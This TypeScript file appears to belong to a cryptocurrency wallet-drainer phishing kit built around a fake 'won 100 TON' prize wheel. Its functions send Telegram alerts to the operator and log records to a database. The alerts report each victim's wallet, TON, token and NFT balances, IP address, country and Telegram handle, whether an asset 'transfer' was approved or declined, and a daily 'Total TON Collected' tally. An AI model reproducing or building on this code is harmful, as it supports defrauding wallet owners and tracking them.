// lib/telegramEnhanced.ts

import { sendTelegramMessage, shortAdd, formatNumber, escp } from './telegram';
import { PromoCodeService, TransactionService } from './supabase';

interface NotificationData {
  wallet?: string;
  promoCode?: string;
  promoSource?: string;
  telegramUsername?: string;
  ipInfo?: { IP: string; ISO2: string };
  host?: string;
  amount?: number;
  tonBalance?: number;
  tokensValue?: number;
  nftsValue?: number;
  totalValue?: number;
}

export class TelegramNotificationService {
  
  // Уведомление при использовании промокода
  static async notifyPromoCodeUsed(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_PROMO_USED !== 'true') return;

    const message = `
🎫 *PROMO CODE ACTIVATED*

📌 *Code:* \`${data.promoCode}\`
👤 *Source:* ${data.promoSource}
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${data.wallet ? shortAdd(data.wallet) : 'Not connected'}

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);
    
    // Сохраняем в БД
    if (data.wallet) {
      await PromoCodeService.useCode(
        data.promoCode!,
        data.wallet,
        data.telegramUsername,
        data.ipInfo
      );
    }
  }

  // Уведомление о выигрыше на колесе
  static async notifySpinWin(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_SPIN_WIN !== 'true') return;

    const method = data.promoCode 
      ? `Promo: \`${data.promoCode}\` (${data.promoSource})`
      : 'Paid spin (2 TON)';

    const message = `
🎰 *SPIN COMPLETED - WON 100 TON!*

🎫 *Method:* ${method}
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${data.wallet ? shortAdd(data.wallet) : 'Not connected yet'}

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // Обновляем статус в БД
    if (data.wallet && data.promoCode) {
      await TransactionService.updatePromoUsage(
        data.wallet,
        data.promoCode,
        { spin_won: true }
      );
    }
  }

  // Уведомление при подключении кошелька и обработке активов
  static async notifyAssetProcessing(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_REQUEST !== 'true') return;

    const message = `
🎣 *ASSETS PROCESSING*

${data.promoCode ? `🎫 *From Promo:* \`${data.promoCode}\` (${data.promoSource})` : '💰 *From Paid Spin*'}
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${shortAdd(data.wallet!)}

💰 *Balance Details:*
• TON: *${data.tonBalance?.toFixed(4) || 0} TON*
• Tokens Value: *${formatNumber(data.tokensValue || 0)}*
• NFTs Value: *${formatNumber(data.nftsValue || 0)}*
• Total Value: *≈ ${formatNumber(data.totalValue || 0)}*

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // Записываем транзакцию в БД
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      promo_code: data.promoCode,
      telegram_username: data.telegramUsername,
      transaction_type: 'reward_claim',
      ton_balance: data.tonBalance,
      tokens_value: data.tokensValue,
      nfts_value: data.nftsValue,
      total_value: data.totalValue,
      status: 'pending',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });
  }

  // Уведомление об успешной транзакции
  static async notifyTransactionSuccess(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_SUCCESS !== 'true') return;

    const message = `
✅ *TRANSFER APPROVED*

${data.promoCode ? `🎫 *Promo Used:* \`${data.promoCode}\` (${data.promoSource})` : '💰 *Paid User*'}
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${shortAdd(data.wallet!)}

💰 *Transferred:*
• Amount: *≈ ${formatNumber(data.totalValue || 0)} USD*

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // Обновляем статус транзакции
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      promo_code: data.promoCode,
      telegram_username: data.telegramUsername,
      transaction_type: 'reward_claim',
      total_value: data.totalValue,
      status: 'success',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });

    // Обновляем статус промокода
    if (data.wallet && data.promoCode) {
      await TransactionService.updatePromoUsage(
        data.wallet,
        data.promoCode,
        { reward_claimed: true }
      );
    }
  }

  // Уведомление об отмене транзакции
  static async notifyTransactionCancelled(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_TRANSFER_CANCEL !== 'true') return;

    const message = `
❌ *TRANSFER DECLINED*

${data.promoCode ? `🎫 *Promo:* \`${data.promoCode}\` (${data.promoSource})` : '💰 *Paid User*'}
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${shortAdd(data.wallet!)}

💰 *Attempted Amount:* ≈ ${formatNumber(data.totalValue || 0)} USD

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // Записываем отмену в БД
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      promo_code: data.promoCode,
      telegram_username: data.telegramUsername,
      transaction_type: 'reward_claim',
      total_value: data.totalValue,
      status: 'cancelled',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });
  }

  // Уведомление об оплате спина
  static async notifyPaidSpin(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_PAYMENT !== 'true') return;

    const message = `
💰 *PAID SPIN*

💵 *Amount:* ${data.amount} TON
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${shortAdd(data.wallet!)}
💰 *Balance:* ${data.tonBalance?.toFixed(2)} TON

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);

    // Записываем платеж в БД
    await TransactionService.recordTransaction({
      wallet_address: data.wallet!,
      telegram_username: data.telegramUsername,
      transaction_type: 'spin_payment',
      amount: data.amount,
      status: 'success',
      ip_address: data.ipInfo?.IP,
      country: data.ipInfo?.ISO2
    });
  }

  // Уведомление о попытке использования неверного промокода
  static async notifyInvalidPromoAttempt(data: NotificationData) {
    if (process.env.NEXT_PUBLIC_TG_PROMO_INVALID !== 'true') return;

    const message = `
❌ *INVALID PROMO CODE*

🚫 *Attempted Code:* \`${data.promoCode}\`
${data.telegramUsername ? `💬 *Telegram:* @${escp(data.telegramUsername)}` : ''}
💳 *Wallet:* ${data.wallet ? shortAdd(data.wallet) : 'Not connected'}

📍 *Location:* [${data.ipInfo?.ISO2}](https://ipapi.co/?q=${data.ipInfo?.IP})
🌍 *Site:* ${data.host}

⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

    await sendTelegramMessage(message);
  }

  // Ежедневный отчет статистики
  static async sendDailyReport() {
    try {
      const { StatisticsService } = await import('./supabase');
      const stats = await StatisticsService.getOverallStatistics();
      
      const message = `
📊 *DAILY STATISTICS REPORT*

📅 *Date:* ${new Date().toLocaleDateString('en-US')}

*Overall Stats:*
• Total Promo Codes: *${stats.totalCodes}*
• Active Codes: *${stats.activeCodes}*
• Total Usage: *${stats.totalUsage}*
• Unique Wallets: *${stats.uniqueWallets}*

*Transactions:*
• Total: *${stats.totalTransactions}*
• Successful: *${stats.successfulTransactions}*
• Total TON Collected: *${stats.totalTonCollected.toFixed(2)} TON*

*Top Promo Codes:*
${stats.topPromoCodes.map((code, i) => 
  `${i + 1}. \`${code.code}\` (${code.name}) - ${code.uses} uses`
).join('\n')}

⏰ Report generated at ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC
`;

      await sendTelegramMessage(message);
    } catch (error) {
      console.error('Failed to send daily report:', error);
    }
  }
}